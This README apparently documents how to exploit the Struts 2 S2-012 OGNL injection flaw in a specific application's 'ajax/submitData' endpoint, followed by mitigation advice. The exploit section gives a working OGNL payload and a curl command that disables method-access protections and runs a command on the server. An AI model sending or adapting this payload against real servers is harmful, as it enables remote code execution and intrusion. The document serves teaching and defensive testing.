# Exploiting S2-012 in the Current Application

## Overview
S2-012 is a vulnerability in Apache Struts 2 that allows attackers to execute arbitrary OGNL (Object-Graph Navigation Language) expressions. This vulnerability arises due to improper handling of user input in the `struts.xml` configuration file, particularly when dynamic method invocation is enabled.

## Steps to Exploit

1. **Identify the Vulnerable Endpoint**:
   - The vulnerable endpoint in this application is the AJAX handler `ajax/submitData`.
   - This endpoint is configured in `struts.xml` to process user input dynamically.

2. **Craft Malicious Input**:
   - An attacker can send a specially crafted request containing OGNL expressions in the `name` or `age` parameters.
   - Example payload:
     ```
     name=%{#context[\'xwork.MethodAccessor.denyMethodExecution\']=false,#_memberAccess[\'allowStaticMethodAccess\']=true,@java.lang.Runtime@getRuntime().exec('calc')}
     age=25
     ```

3. **Send the Exploit**:
   - Use a tool like `curl` or a browser extension to send the malicious payload to the vulnerable endpoint.
   - Example `curl` command:
     ```
     curl -X POST -d "name=%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('calc')}" -d "age=25" http://<server-address>/ajax/submitData
     ```

4. **Observe the Result**:
   - If successful, the OGNL expression will be executed on the server, allowing the attacker to run arbitrary commands.

## Mitigation

To prevent exploitation of S2-012:

1. **Upgrade Struts**:
   - Update to the latest version of Apache Struts 2, where this vulnerability has been patched.

2. **Disable Dynamic Method Invocation**:
   - In `struts.xml`, set `struts.enable.DynamicMethodInvocation` to `false`.

3. **Validate User Input**:
   - Use input validation to ensure that only expected data is processed by the application.

4. **Use Security Plugins**:
   - Employ security plugins or WAF (Web Application Firewall) to detect and block malicious requests.

## Disclaimer
This README is for educational purposes only. Exploiting vulnerabilities without proper authorization is illegal and unethical.